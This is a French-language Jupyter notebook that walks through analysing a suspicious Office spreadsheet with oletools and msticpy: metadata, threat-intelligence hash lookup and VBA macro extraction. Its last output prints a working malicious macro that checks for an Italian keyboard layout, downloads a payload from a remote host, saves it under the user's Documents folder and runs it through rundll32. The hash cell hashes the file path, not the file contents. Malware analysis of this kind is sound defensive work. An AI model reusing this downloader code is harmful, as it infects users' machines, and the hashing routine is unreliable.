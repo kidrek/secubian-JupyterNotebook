{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Analyse de document Microsoft Office\n",
    "\n",
    "Plusieurs types de fichiers sont disponibles au sein de la suite Microsoft Office :\n",
    "- les **documents OLE**, que nous connaissons tous : \n",
    "  - **Excel** : \".xls\"\n",
    "  - **Powerpoint** : \".ppt\"\n",
    "  - **Word** : \".doc\"\n",
    "- les **documents Office Open XML \"OOXML\"** correspondent à des archives de documents XML (documents compressés). Ce type de document, standardisé via l'ISO/IEC 29500, a été introduit dans la suite Microsoft Office pour la première fois dans la version 2010. \n",
    "  - **Excel** : \".xlsx\"\n",
    "  - **Powerpoint** : \".pptx\"\n",
    "  - **Word** : \".docx\"\n",
    "- les documents RTF, ayant pour extension \".rtf\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<p style=''><font color='orange'><h3>Notebook setup completed with some warnings.</h3></p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>One or more configuration items were missing or set incorrectly.</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Please run the <i>Getting Started Guide for Azure Sentinel ML Notebooks</i> notebook. and the <a href='https://msticpy.readthedocs.io/en/latest/getting_started/msticpyconfig.html'>msticpy configuration guide</a>.</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>This notebook may still run but with reduced functionality.</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from colorama import init, Fore, Back, Style\n",
    "import msticpy as mp\n",
    "mp.init_notebook(globals(), verbosity=0)\n",
    "ti = mp.TILookup()\n",
    "\n",
    "\n",
    "# Chemin du fichier à analyser\n",
    "officeFile = {}\n",
    "officeFile['path'] = \"/home/secubian/Desktop/Cases/Microsoft_Office/onenot_2623024aba1ee994dcb82e937a8beb59abbebf51b6aa4cde8434bb56458b47da.one\"\n",
    "officeFile['path'] = \"/home/secubian/Desktop/Cases/Microsoft_Office/8ed7befccff98a6acb255f63071a6e6ac1410c1d3b08ce560cac3cfe24572c8e.xlsx\"\n",
    "#officeFile['path'] = \"/home/secubian/Desktop/Cases/Microsoft_Office/eeb7b78972ba051833135c6ba4215c0faf93d5dfe1c5603f74c777b38867646b.xlsx\"\n",
    "officeFile['path'] = \"/home/secubian/Desktop/Cases/Microsoft_Office/5b0f61b42e9a6c238c7028751bf75c484778219cf88a7c5007c2a49e14351e70.xls\"\n"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Analyse des méta données\n",
    "\n",
    "Il est important d'extraire des informations permettant d'obtenir du contexte sur le document, telles que l'auteur, le logiciel utilisé, les signatures numériques (hash). "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 126,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[32m[✓] File format: MS Excel 97-2003 Workbook or Template\n",
      "\u001b[32m[✓] Container format: OLE\n",
      "\u001b[32m[✓] Application name: None\n",
      "\u001b[32m[✓] Properties code page: 1252: ANSI Latin 1; Western European (Windows)\n",
      "\u001b[32m[✓] Author: b'G L S'\n",
      "\u001b[32m[✓] Encrypted: False\n",
      "\u001b[31m[!] VBA Macros: Yes\n",
      "\u001b[32m[✓] VBA Macros: Yes\n",
      "\u001b[32m[✓] XLM Macros: No\n",
      "\u001b[32m[✓] External Relationships: 0\n",
      "\u001b[32m[✓] ObjectPool: False\n",
      "\u001b[32m[✓] Flash objects: 0\n"
     ]
    }
   ],
   "source": [
    "import oletools.oleid\n",
    "oid = oletools.oleid.OleID(officeFile['path'])\n",
    "officeFile['oleid'] = {}\n",
    "indicators = oid.check()\n",
    "for i in indicators:\n",
    "    officeFile['oleid'][i.name] = i.value\n",
    "\n",
    "for indicator in officeFile['oleid']:\n",
    "    try:\n",
    "        if (isinstance(officeFile['oleid'][indicator],bool) and officeFile['oleid'][indicator]) or (isinstance(officeFile['oleid'][indicator],int) and officeFile['oleid'][indicator]>0) or(officeFile['oleid'][indicator][0:3] == \"Yes\"):\n",
    "            print(Fore.RED + f\"[!] {indicator}: {officeFile['oleid'][indicator]}\")\n",
    "    except:\n",
    "        pass\n",
    "    finally:\n",
    "        print(Fore.GREEN + f\"[✓] {indicator}: {officeFile['oleid'][indicator]}\")"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Extraction des signatures numériques (HASH), permettant la recherche dans les bases de Threat Intelligence."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "48607110b05947378c57181d3f8014a5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Observables processed:   0%|          | 0/4 [00:00<?, ?obs/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[32mMicrosoft Office file HASH.\n",
      "\u001b[32m[✓] MD5: \t41c68558278509e42949e8b860966078 \n",
      "\u001b[32m[✓] SHA256: \t64651b5fa3c7d81798075d9941afd77ac9fc0776fded36c1ed75e50d339952c2\n",
      "\u001b[31m[!] Potentially identified as malicious\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Ioc</th>\n",
       "      <th>Provider</th>\n",
       "      <th>Details.pulse_count</th>\n",
       "      <th>Details.sections_available</th>\n",
       "      <th>Details.verbose_msg</th>\n",
       "      <th>Details.response_code</th>\n",
       "      <th>Details.positives</th>\n",
       "      <th>Details.resource</th>\n",
       "      <th>Details.permalink</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>41c68558278509e42949e8b860966078</td>\n",
       "      <td>OTX</td>\n",
       "      <td>0.0</td>\n",
       "      <td>[general, analysis]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>64651b5fa3c7d81798075d9941afd77ac9fc0776fded36c1ed75e50d339952c2</td>\n",
       "      <td>OTX</td>\n",
       "      <td>0.0</td>\n",
       "      <td>[general, analysis]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>41c68558278509e42949e8b860966078</td>\n",
       "      <td>VirusTotal</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>The requested resource is not among the finished, queued or pending scans</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>41c68558278509e42949e8b860966078</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>64651b5fa3c7d81798075d9941afd77ac9fc0776fded36c1ed75e50d339952c2</td>\n",
       "      <td>VirusTotal</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>The requested resource is not among the finished, queued or pending scans</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>64651b5fa3c7d81798075d9941afd77ac9fc0776fded36c1ed75e50d339952c2</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                                Ioc  \\\n",
       "0                                  41c68558278509e42949e8b860966078   \n",
       "1  64651b5fa3c7d81798075d9941afd77ac9fc0776fded36c1ed75e50d339952c2   \n",
       "2                                  41c68558278509e42949e8b860966078   \n",
       "3  64651b5fa3c7d81798075d9941afd77ac9fc0776fded36c1ed75e50d339952c2   \n",
       "\n",
       "     Provider  Details.pulse_count Details.sections_available  \\\n",
       "0         OTX                  0.0        [general, analysis]   \n",
       "1         OTX                  0.0        [general, analysis]   \n",
       "2  VirusTotal                  NaN                        NaN   \n",
       "3  VirusTotal                  NaN                        NaN   \n",
       "\n",
       "                                                         Details.verbose_msg  \\\n",
       "0                                                                        NaN   \n",
       "1                                                                        NaN   \n",
       "2  The requested resource is not among the finished, queued or pending scans   \n",
       "3  The requested resource is not among the finished, queued or pending scans   \n",
       "\n",
       "   Details.response_code  Details.positives  \\\n",
       "0                    NaN                NaN   \n",
       "1                    NaN                NaN   \n",
       "2                    0.0                0.0   \n",
       "3                    0.0                0.0   \n",
       "\n",
       "                                                   Details.resource  \\\n",
       "0                                                               NaN   \n",
       "1                                                               NaN   \n",
       "2                                  41c68558278509e42949e8b860966078   \n",
       "3  64651b5fa3c7d81798075d9941afd77ac9fc0776fded36c1ed75e50d339952c2   \n",
       "\n",
       "   Details.permalink  \n",
       "0                NaN  \n",
       "1                NaN  \n",
       "2                NaN  \n",
       "3                NaN  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import hashlib\n",
    "officeFile['md5'] = hashlib.md5(officeFile['path'].encode('UTF-8')).hexdigest()\n",
    "officeFile['sha256'] = hashlib.sha256(officeFile['path'].encode('UTF-8')).hexdigest()\n",
    "\n",
    "df_ti = ti.lookup_iocs(data=[officeFile['md5'], officeFile['sha256']], providers=[\"VirusTotal\", \"OTX\"])\n",
    "#df_ti = df_ti[df_ti['Result']==True]\n",
    "df_ti = pd.json_normalize(data=df_ti[['Ioc','Provider','Details']].to_dict(orient='records'))\n",
    "\n",
    "print(Fore.GREEN + \"Microsoft Office file HASH.\")\n",
    "print(Fore.GREEN + f\"[✓] MD5: \\t{officeFile['md5'] } \")\n",
    "print(Fore.GREEN + f\"[✓] SHA256: \\t{officeFile['sha256'] }\")\n",
    "\n",
    "if (df_ti.empty):\n",
    "    print(Fore.GREEN + \"[✓] No Potentially identified as malicious\")\n",
    "else:\n",
    "    print(Fore.RED + \"[!] Potentially identified as malicious\")\n",
    "    display(df_ti)\n"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Extraction et Analyse des macros\n",
    "\n",
    "Les macros sont des éléments permettant d'exécuter des morceaux de code à l'ouverture du document ou à lors d'événements bien précis."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[31m[!] VBA Macros found\n",
      "\u001b[31m[!] AutoExec keywords: 0\n",
      "\u001b[31m[!] IOCs: 1\n",
      "\u001b[31m[!] Hex obfuscated strings: 4\n",
      "\u001b[31m[!] Base64 obfuscated strings: 1\n",
      "\u001b[31m[!] Dridex obfuscated strings: 0\n",
      "\u001b[31m[!] VBA obfuscated strings: 0\n",
      "\n",
      "\n",
      "\u001b[31m[!] Suspicious patterns : 14\n",
      "[Suspicious] - Environ : May read system environment variables\n",
      "[Suspicious] - Open : May open a file\n",
      "[Suspicious] - Write : May write to a file (if combined with Open)\n",
      "[Suspicious] - Output : May write to a file (if combined with Open)\n",
      "[Suspicious] - ADODB.Stream : May create a text file\n",
      "[Suspicious] - SaveToFile : May create a text file\n",
      "[Suspicious] - shell : May run an executable file or a system command\n",
      "[Suspicious] - wscript.shell : May run an executable file or a system command\n",
      "[Suspicious] - Run : May run an executable file or a system command\n",
      "[Suspicious] - CreateObject : May create an OLE object\n",
      "[Suspicious] - Lib : May run code from a DLL\n",
      "[Suspicious] - MSXML2.XMLHTTP : May download files from the Internet\n",
      "[Suspicious] - Hex Strings : Hex-encoded strings were detected, may be used to obfuscate strings (option --decode to see all)\n",
      "[Suspicious] - Base64 Strings : Base64-encoded strings were detected, may be used to obfuscate strings (option --decode to see all)\n",
      "[IOC] - InetCpl.cpl : Executable file name\n"
     ]
    }
   ],
   "source": [
    "# https://github.com/decalage2/oletools/wiki/olevba\n",
    "from oletools.olevba import VBA_Parser, TYPE_OLE, TYPE_OpenXML, TYPE_Word2003_XML, TYPE_MHTML\n",
    "vbaparser = VBA_Parser(officeFile['path'])\n",
    "\n",
    "if vbaparser.detect_vba_macros():\n",
    "    print(Fore.RED + \"[!] VBA Macros found\")\n",
    "    results = vbaparser.analyze_macros()\n",
    "    print(Fore.RED + f\"[!] AutoExec keywords: {vbaparser.nb_autoexec}\")\n",
    "    print(Fore.RED + f\"[!] IOCs: {vbaparser.nb_iocs}\")\n",
    "    print(Fore.RED + f\"[!] Hex obfuscated strings: {vbaparser.nb_hexstrings}\")\n",
    "    print(Fore.RED + f\"[!] Base64 obfuscated strings: {vbaparser.nb_base64strings}\")\n",
    "    print(Fore.RED + f\"[!] Dridex obfuscated strings: {vbaparser.nb_dridexstrings}\")\n",
    "    print(Fore.RED + f\"[!] VBA obfuscated strings: {vbaparser.nb_vbastrings}\")\n",
    "\n",
    "    print(\"\\n\")\n",
    "    print(Fore.RED + f\"[!] Suspicious patterns : {vbaparser.nb_suspicious}\")\n",
    "    for kw_type, keyword, description in results:\n",
    "        #print('type=%s - keyword=%s - description=%s' % (kw_type, keyword, description))\n",
    "        print(f\"[{kw_type}] - {keyword} : {description}\")\n",
    "else:\n",
    "    print(Fore.GREEN + \"[✓] No VBA Macros found\")\n"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Cette tentative se base sur les résultats obtenus précédemments. Si aucune chaine obfusquée n'a été détectée, aucun résultat ne sera obtenu."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 127,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[31m\n",
      "Attribute VB_Name = \"Foglio1\"\n",
      "Attribute VB_Base = \"0{00020820-0000-0000-C000-000000000046}\"\n",
      "Attribute VB_GlobalNameSpace = False\n",
      "Attribute VB_Creatable = False\n",
      "Attribute VB_PredeclaredId = True\n",
      "Attribute VB_Exposed = True\n",
      "Attribute VB_TemplateDerived = False\n",
      "Attribute VB_Customizable = True\n",
      "Private Const rrv As Long = 9\n",
      "\n",
      "Private Declare PtrSafe Function KLayoutN Lib \"user32\"     Alias \"GetKeyboardLayoutNameA\" (     ByVal pwszKLID As String) As Long\n",
      "    \n",
      "\n",
      "\n",
      "Sub generale()\n",
      " \n",
      "    Dim sB As String\n",
      "    \n",
      "    sB = Space(rrv - 1)\n",
      "    KLayoutN sB\n",
      "    If CSng(Right(sB, 2)) <> 10 Then Workbooks.Application.DisplayAlerts = False: Application.Quit\n",
      "    info_servizi \"IT\"\n",
      "\n",
      "\n",
      "End Sub\n",
      "\n",
      "Sub info_servizi(Aaa)\n",
      "Orios = msoShapeStylePreset32\n",
      "Dim oXHTTP As Object\n",
      "Set oXHTTP = CreateObject(\"MSXML2.XMLHTTP\")\n",
      "KioER = \"http://inter\" & Aaa & Orios & \".com\"\n",
      "oXHTTP.Open \"get\", KioER, False\n",
      "oXHTTP.setRequestHeader \"Akamai-GRN\", \"fetch\"\n",
      "oXHTTP.send\n",
      "\n",
      "Glow = \",#\" & Len(oXHTTP.getResponseHeader(\"Akamai-GRN\"))\n",
      "\n",
      "        Set oStream = CreateObject(\"ADODB.Stream\")\n",
      "        With oStream\n",
      "            .Type = 1\n",
      "            .Open\n",
      "            .Write oXHTTP.responseBody\n",
      "            master = agenziaimm(Int(995643400 * Rnd) + 13567) & \".cvs\"\n",
      "            Open master For Output As Orios: Close Orios\n",
      "            .SaveToFile master, 2\n",
      "            .Close\n",
      "            master = \" \" & master & Glow\n",
      "            Orios = \"nDll\" & Orios\n",
      "            Pl = \"Ru\" & Orios & master:\n",
      "            With CreateObject(\"wscript.shell\"): Set oXHTTP = .Run(Pl & \"  InetCpl.cpl,ClearMyTracksByProcess 255\", 0, True): End With\n",
      "        End With\n",
      "End Sub\n",
      "\n",
      "Function agenziaimm(Ver)\n",
      "\n",
      "N = 8900\n",
      "Kli = \"\" & Environ$(\"USERPROFILE\") & \"\\Documents\" &                         Application.PathSeparator & Ver\n",
      "Acorreus = Len(Kli)\n",
      "agenziaimm = Kli\n",
      "End Function\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "' 0085      9 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - \u0000\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# https://github.com/decalage2/oletools/wiki/olevba\n",
    "if vbaparser.nb_hexstrings or vbaparser.nb_base64strings or vbaparser.nb_dridexstrings or vbaparser.nb_vbastrings:\n",
    "    print()\n",
    "    print(Fore.RED + vbaparser.reveal())\n",
    "else:\n",
    "    print(Fore.GREEN + \"[✓] No VBA obfuscated strings found\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "916dbcbb3f70747c44a77c7bcd40155683ae19c65e1c03b4aa3499c5328201f1"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
